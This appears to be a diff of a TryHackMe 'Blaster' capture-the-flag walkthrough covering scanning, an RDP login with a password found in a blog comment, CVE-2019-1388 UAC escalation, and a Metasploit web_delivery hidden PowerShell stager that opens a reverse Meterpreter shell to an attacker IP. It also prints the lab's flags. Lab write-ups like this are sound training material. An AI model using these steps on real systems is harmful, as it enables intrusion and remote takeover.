@@ -1,70 +1,97 @@
 # Walktrough : TryHackMe - Blaster
-## Executive Summary
-This report documents the end-to-end exploitation, privilege escalation, and persistence phases completed on the host RETROWEB (```10.48.191.50```). The assessment successfully achieved full administrative compromise (```NT AUTHORITY\SYSTEM```) and retrieved both user and root target flags.
+Target IP: ```10.49.161.42 / 10.48.191.50```
+Attacker IP: ```192.168.135.130```
+Initial Access User: ```wade```
+Elevated Access: ```NT AUTHORITY\SYSTEM```
 
-## 1. Initial Access & User Reconnaissance
-- Target System: ```10.48.191.50``` (RETROWEB)
-- Authentication Method: Remote Desktop Protocol (RDP)
-- Credentials: ```wade``` : ```parzival```
+## Phase 1: Reconnaissance & Enumeration
+1. Network Port Scanning
+- Command Executed:
+```bash
+nmap -sV -sC 10.49.161.42 -Pn
+```
+- Results: Revealed two open services:
+  - Port 80/tcp: Microsoft IIS httpd 10.0
+  - Port 3389/tcp: Microsoft Terminal Services (RDP) on domain ```RETROWEB```
 
-Execution Steps:
+2. Directory Fuzzing
+- Command Executed:
+```bash
+gobuster dir -u http://10.49.161.42 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+```
+- Results: Discovered hidden web path ```/retro``` (Status 301).
 
-1. Initiated RDP session from Kali Linux (```192.168.135.130```):
+3. Web Application Reconnaissance & Credential Harvest
+- Findings:
+  - Navigated to ```[http://10.49.161.42/retro/](http://10.49.161.42/retro/)``` which exposed the "Retro Fanatics" blog.
+  - Identified the blog author as user ```Wade```.
+  - Located a comment posted by ```Wade``` on the "Ready Player One" post containing the potential password: ```parzival```.
+
+## Phase 2: Initial Access & User Flag Retrieval
+Establish an RDP session using harvested credentials to acquire standard user access.
+- RDP Connection:
 ```bash
 xfreerdp /u:wade /p:parzival /v:10.48.191.50
 ```
-2. Accessed desktop environment and extracted initial user flag:
-      - Location: ```C:\Users\Wade\Desktop\user.txt```
-      - User Flag: ```THM{HACK_PLAYER_ONE}```
+- User Flag Retrieval:
+  - Opened ```C:\Users\wade\Desktop\user.txt``` via Notepad.
+  - User Flag: ```THM{HACK_PLAYER_ONE}```
 
----
+## Phase 3: Privilege Escalation (CVE-2019-1388)
+Exploit an unpatched Windows User Account Control vulnerability via signed executables (```hhupd.exe```) to spawn an elevated shell.
+1. Trigger Elevation Prompt: Executed ```C:\Users\Wade\Desktop\hhupd.exe``` to bring up the UAC prompt.
+2. Inspect Publisher Certificate: Clicked "Show information about the publisher's certificate" to view details for ```VeriSign Commercial Software Publishers CA```.
+3. Invoke Elevated Browser Context: Clicked the issuer URL inside the certificate window to launch Internet Explorer with elevated permissions.
+4. Browse System Directory: Opened the file picker via ```File -> Save as...``` and navigated to ```c:\windows\system32\*.*```.
+5. Spawn SYSTEM Command Shell: Located ```cmd.exe```, right-clicked, and opened it directly to gain interactive access.
 
-## 2. Privilege Escalation (CVE-2019-1388)
-- Vulnerability: Windows User Account Control (UAC) Certificate Dialog Privilege Escalation
-- Target Binary: ```C:\Users\Wade\Desktop\hhupd.exe```
-
-Execution Steps:
-
-1. Executed ```hhupd.exe``` via Run as administrator.
-2. Selected Show information about the publisher's certificate within the UAC prompt.
-3. Clicked the VeriSign Commercial Software Publishers CA hyperlink, triggering Internet Explorer under ```SYSTEM``` context.
-4. Used Internet Explorer's file browser (```File -> Save as...```) to navigate to ```C:\Windows\System32\*.*```.
-5. Executed ```cmd.exe``` directly from the file dialog to spawn an elevated shell.
-6. Verified execution context: ```nt authority\system```.
-
----
-
-## 3. Persistence & C2 Channel (Metasploit Web Delivery)
-
-- Attacker IP: ```192.168.135.130```
-- Delivery Module: ```exploit/multi/script/web_delivery```
-- Payload: ```windows/meterpreter/reverse_http```
-
-Configuration & Staging:
+- Privilege Verification:
 ```bash
+C:\Windows\System32> whoami
+nt authority\system
+```
+6. Administrator Flag Retrieval:
+```bash
+type C:\Users\Administrator\Desktop\root.txt
+```
+Root Flag: ```THM{COIN_OPERATED_EXPLOITATION}```
+
+## Phase 4: Metasploit Payload Delivery (web_delivery)
+Establish a persistent reverse Meterpreter session back to the handler.
+1. Configure Metasploit Module:
+```bash
+msfconsole
 use exploit/multi/script/web_delivery
 set LHOST 192.168.135.130
+set SRVPORT 1234
 set target 2
 set payload windows/meterpreter/reverse_http
-set SRVPORT 1234
 run
 ```
-Payload Execution:
-- Executed generated Base64 PowerShell payload inside the elevated ```cmd.exe``` prompt on target:
+2. Execute Encoded Payload on Target:
+Executed the generated Base64 PowerShell command inside the elevated shell:
 ```bash
-powershell.exe -nop -w hidden -e <BASE64_PAYLOAD>
+powershell.exe -nop -w hidden -e WwBPTk...[REDACTED]...==
 ```
-- Handled incoming reverse HTTP connection, delivering AMSI bypass and payload staging to establish interactive session.
-
----
-
-## 4. Post-Exploitation & Evidence Capture
-
-- Active Session: Session 1 (```meterpreter x86/windows```) as ```NT AUTHORITY\SYSTEM```.
-- Root Flag Retrieval:
+3. Verify Interactive Meterpreter Session:
 ```bash
-meterpreter > sessions 1
+msf exploit(multi/script/web_delivery) > sessions
+
+Active sessions
+================
+
+Id  Name  Type                     Information                     Connection
+--  ----  ----                     -----------                     ----------
+1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ RETROWEB  192.168.135.130:8080 -> 10.48.191.50:50169
+
+msf exploit(multi/script/web_delivery) > sessions 1
+[*] Starting interaction with 1...
+
 meterpreter > ls C:\Users\Administrator\Desktop
-meterpreter > cat C:\Users\Administrator\Desktop\root.txt
+Listing: C:\Users\Administrator\Desktop
+=======================================
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  282   fil   2019-12-09 02:10:15 -0500  desktop.ini
+100666/rw-rw-rw-  31    fil   2020-04-23 13:34:00 -0400  root.txt
 ```
-- Root Flag: ```THM{COIN_OPERATED_EXPLOITATION}```
